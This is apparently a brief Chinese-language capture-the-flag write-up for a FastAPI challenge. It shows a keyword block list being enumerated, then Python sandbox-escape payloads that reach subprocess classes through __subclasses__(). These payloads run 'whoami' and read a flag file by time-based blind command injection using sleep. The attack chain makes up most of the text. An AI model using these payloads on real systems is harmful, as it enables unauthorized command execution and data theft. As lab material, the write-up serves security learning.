## fastapi
https://fastapi.tiangolo.com/

## 解题思路
/docs
/redoc

```python
dir()	
[
"block_list",
"keyword",
"q"
]

block_list
[
"import",
"open",
"eval",
"exec"
]

vars()
{
"q": "vars()",
"block_list": [
  "import",
  "open",
  "eval",
  "exec"
],
"keyword": "exec"
}

str(().__class__.__bases__[0].__subclasses__()[238])
str(().__class__.__bases__[0].__subclasses__()[238]("whoami"))
print(().__class__.__bases__[0].__subclasses__()[238]("whoami"))

str(().__class__.__bases__[0].__subclasses__()[220]("if [ `cut -c 1 /mnt/f1a9` = 'f' ];then sleep 4;fi",shell=True).wait())
```
半无回显模板注入+命令时间盲注

